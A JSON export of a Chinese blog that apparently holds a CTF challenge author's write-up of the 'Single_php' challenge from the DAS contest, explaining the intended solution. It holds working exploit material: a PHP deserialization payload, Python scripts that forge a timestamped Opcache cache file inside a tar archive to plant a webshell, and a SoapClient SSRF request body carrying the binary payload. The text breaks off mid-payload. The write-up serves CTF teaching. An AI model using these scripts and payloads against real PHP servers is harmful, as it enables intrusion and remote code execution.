{"meta":{"title":"光辉的blog啦~~","subtitle":"","description":"","author":"1llustrious","url":"https://1llustrious.github.io","root":"/"},"pages":[{"title":"links","date":"2023-12-01T00:12:08.000Z","updated":"2023-12-01T00:36:51.320Z","comments":true,"path":"links/index.html","permalink":"https://1llustrious.github.io/links/index.html","excerpt":"","text":""},{"title":"about","date":"2023-12-01T07:41:57.000Z","updated":"2023-12-01T07:41:57.598Z","comments":true,"path":"about/index.html","permalink":"https://1llustrious.github.io/about/index.html","excerpt":"","text":""}],"posts":[{"title":"links","slug":"links","date":"2023-12-01T07:41:27.000Z","updated":"2023-12-01T07:41:27.752Z","comments":true,"path":"2023/12/01/links/","link":"","permalink":"https://1llustrious.github.io/2023/12/01/links/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"关于DAS的小记","slug":"关于DAS的小记","date":"2023-12-01T01:10:33.000Z","updated":"2023-12-01T07:42:41.645Z","comments":true,"path":"2023/12/01/关于DAS的小记/","link":"","permalink":"https://1llustrious.github.io/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/","excerpt":"","text":"写在前面 Single_php Opcache SoapClient Ezfastjson Nomap 写在前面 调用链 writeObject 内存马 kali_tips # 写在前面 这次 DAS 是我们 0psu3 成员出的题，这也是我第一次出题给各位师傅做，有出得不好的地方还希望师傅们轻点喷😭😭😭. 我出的是 Single_php , 一开始只是想出一个 Opcache 扩展漏洞的，通过文件上传到 /tmp 目录下覆盖的，后来在思考，怎么给师傅们 phpinfo, 于是我就想起了可以通过数组的形式调用任意无参方法，于是我又改了一下，打算配套整个 SSRF, 众所周知，调用 SoapClient 不存在的方法，就可以打 SSRF, 通过 UA 进行报文伪造，而且又涉及到文件上传，压缩包的数据在报文里面一般都是乱码，伪造起来比较麻烦，于是我通过 python 发包，获取 body, 于是就有了这道题的打法. 另外本文中，我还会整一个 Ezfastjson 的内容，分享一些微不足道的小知识，还请师傅们手下留情. # Single_php 这道题的最终结果意想不到，我预计难度中等，想着几个简单的知识点凑一块可能会被打烂，但完全出乎意料. 该题目叫 Single_php 完全是我夹带私货，多少有点个人恩怨了😅 ?LuckyE=highlight_file 获得源码 企业，我的企业斯哈斯哈🥵🥵🥵🥵 但是，我已经单身 19 年了，而身边的人都已经脱单了～～，我要复仇！！！(bushi)~~ 尤其是某 S 开头的师傅. 这就能看到源码了，是不是很简单😊😊😊 123456789101112&lt;?php error_reporting(0); class siroha&#123; public $koi; public function __destruct()&#123; $this-&gt;koi[&#x27;zhanjiangdiyishenqing&#x27;](); &#125; &#125; $kanozyo = $_GET[&#x27;LuckyE&#x27;](__FILE__); var_dump($kanozyo); $suki = unserialize($_POST[&#x27;suki&#x27;]); 你看，源码就这么点内容. 已经能对当前文件进行操作，不过为了防止师傅们乱搞，防止一些奇奇怪怪非预期，我将当前目录设置为只读了🤣, 真不是我懒. 信息搜集提示还有个文件 siranai.php (希腊奶哟) 这可是通过 SSRF 触发文件上传涅🥰🥰 软链接？似乎不行，目录穿越？也不行，都说了当前目录只读，能操控的只有 /tmp 目录了. 不过有个 phpinfo, 还是要继续信息搜集 12345678class siroha&#123; public $koi;&#125;$a = new siroha();$a-&gt;koi = [&quot;zhanjiangdiyishenqing&quot;=&gt;&quot;phpinfo&quot;];echo urlencode(serialize($a)); 哦，有个扩展，这个扩展是有漏洞的. # Opcache 具体来说，就是在 /tmp 某一特定目录下，放了缓存文件，访问 index.php 的时候，会加载这个缓存文件，从而展示页面. 但是，如果缓存文件被篡改，就会变成其它 php 代码，而我们要做的就是通过 tar 文件上传，覆盖掉原本的缓存文件，从而写入一句话. 完成这个利用，需要几个要素: index.php 的最后的时间戳 当前 php 的 systemid. 这个 systemid 的计算脚本简化如下: 1sys_id = hashlib.md5(&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\\002&quot;.encode(&quot;utf-8&quot;)).hexdigest() 根据 php 版本改变. 系统会根据缓存文件的时间戳，判定其有效性，如果时间戳不对，就会删掉缓存文件并重新生成一份，于是我们就需要伪造. 那怎么获取时间戳呢， $_GET['LuckyE'](__FILE__) 除了获取源码之外，还能够获取时间戳. 本地起个相同 php 版本的 docker, 安装扩展. 1docker-php-ext-configure opcache --enable-opcache &amp;&amp; docker-php-ext-install opcache 获取的时间戳，转为十六进制，然后两位两位的倒这放进去 也可以写个脚本修改 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import binasciiimport hashlibimport requestsimport reimport tarfileimport subprocessimport osurl = &quot;http://43.143.192.19:1145/?LuckyE=filectime&quot;def timec(): pattern = r&quot;\\d&#123;10&#125;&quot; timeres = requests.get(url=url) match = re.search(r&#x27;int\\((\\d&#123;10&#125;)\\)&#x27;, timeres.text) # 检查是否有匹配 try: # 提取匹配到的数字 ten_digit_number = match.group(1) print(ten_digit_number) return ten_digit_number except: print(&#x27;dame&#x27;)def split_string_into_pairs(input_string): # 检查输入字符串的长度 if len(input_string) % 2 != 0: raise ValueError(&quot;输入字符串的长度必须是偶数。&quot;) # 使用切片操作将字符串分割成两位一组的子字符串 pairs = [input_string[i:i+2] for i in range(0, len(input_string), 2)] return pairsdef totime(time): b = split_string_into_pairs(f&quot;&#123;hex(int(time))&#125;&quot;) b.pop(0) s = &#x27;&#x27; for i in range(0, len(b)): s += b[-1] b.pop(-1) return sdef changetime(): with open(&quot;index.php.bin&quot;,&quot;rb&quot;) as file: binary_data = file.read() # 将二进制数据转换为十六进制字符串 hex_data = binascii.hexlify(binary_data).decode(&#x27;utf-8&#x27;) new_data = hex_data[0:128]+totime(timec())+hex_data[136:] with open(&quot;index.php.bin&quot;,&quot;wb&quot;) as f: f.write(bytes.fromhex(new_data))changetime() 修改完时间戳后，就可以打包 tar 了 12345678910def tar_file(): tar_filename = &#x27;exp.tar&#x27; with tarfile.open(tar_filename,&#x27;w&#x27;) as tar: directory_info = tarfile.TarInfo(name=f&#x27;&#123;sys_id&#125;/var/www/html&#x27;) directory_info.type = tarfile.DIRTYPE directory_info.mode = 0o777 tar.addfile(directory_info) tar.add(&#x27;index.php.bin&#x27;, arcname=f&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;) 这里为了方便，还是写了个脚本。设置 777 权限也是为了在 /tmp 目录下写进去. 最后就是触发 SSRF 了，由于涉及到 SoapClient 的 UA 注入，而且 tar 包有二进制数据，处理起来比较麻烦. 这里我就直接通过 python 获取了，很方便，👴真 tmd 是个天才！！！ 12345678910111213141516171819202122def tar_file(): tar_filename = &#x27;exp.tar&#x27; with tarfile.open(tar_filename,&#x27;w&#x27;) as tar: directory_info = tarfile.TarInfo(name=f&#x27;&#123;sys_id&#125;/var/www/html&#x27;) directory_info.type = tarfile.DIRTYPE directory_info.mode = 0o777 tar.addfile(directory_info) tar.add(&#x27;index.php.bin&#x27;, arcname=f&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;)tar_file()def upload(): file = &#123;&quot;file&quot;:(&quot;exp.tar&quot;,open(&quot;exp.tar&quot;,&quot;rb&quot;).read(),&quot;application/x-tar&quot;)&#125; res = requests.post(url=url,files=file) print(res.request.headers) return res.requestrequest_content = upload()upload_body = str(request_content.body).replace(&quot;\\&quot;&quot;,&quot;\\\\\\&quot;&quot;)content_length = request_content.headers[&#x27;Content-Length&#x27;]print(content_length)print(upload_body) # SoapClient 12345678910111213141516171819&lt;?phpclass siroha&#123; public $koi;&#125;$postdata = &quot;--0f9486e921f5468f9ab50745c4c93267\\r\\nContent-Disposition: form-data; name=\\&quot;file\\&quot;; filename=\\&quot;exp.tar\\&quot;\\r\\nContent-Type: application/x-tar\\r\\n\\r\\n214510e772fba140ea7a33a277f2799e/var/www/html/\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x000000777\\x000000000\\x000000000\\x0000000000000\\x0000000000000\\x00014543\\x00 5\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00ustar\\x0000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00././@PaxHeader\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x000000000\\x000000000\\x000000000\\x0000000000034\\x0000000000000\\x00010212\\x00 x\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00ustar\\x0000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0028 mtime=1696745575.7742124\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00214510e772fba140ea7a33a277f2799e/var/www/html/index.php.bin\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x000000666\\x000000000\\x000000000\\x0000000001700\\x0014510444150\\x00017165\\x00 0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00ustar\\x0000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00OPCACHE\\x00214510e772fba140ea7a33a277f2799ep\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa9\\xf9 e\\x00\\x00\\x00\\x00\\x07]1\\xcd \\xd8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00badm\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00ibu.\\xb0\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\xfe\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\xfe\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80F\\&quot;e\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00p\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00#olh\\x99F\\&quot;e\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00V\\x00\\x00\\x00\\xb2$\\x83\\xaf\\xdd\\xaa\\xdf\\x8c\\x17\\x00\\x00\\x00\\x00\\x00\\x00\\x00/var/www/html/index.php\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\&quot;@\\xb0\\xc5\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00p\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00V\\x00\\x00\\x00\\xf9\\xe0\\xf8\\xab\\xb5\\xd0\\x00\\x80\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00phpinfo\\x00\\x02\\x00\\x00\\x00V\\x00\\x00\\x00jQ\\xe3\\x0e1\\x00\\x00\\x80\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00_POST\\x00\\x00\\x00E\\x05\\x00\\x00\\x00\\x00\\x00\\x00P\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00=\\x00\\x01\\x00\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x81\\x00\\x00\\x007\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\xff\\xff\\xff\\xff`\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00P\\x01\\x00\\x02A\\x06\\x00\\x00\\x00\\x00\\x00\\x00`\\x00\\x00\\x00\\x02\\x00\\x00\\x00P\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00Q\\x02\\x01\\x02\\xf1\\x05\\x00\\x00\\x00\\x00\\x00\\x00P\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00I\\x02\\x00\\x00F\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x03\\x00\\x00\\x00&gt;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0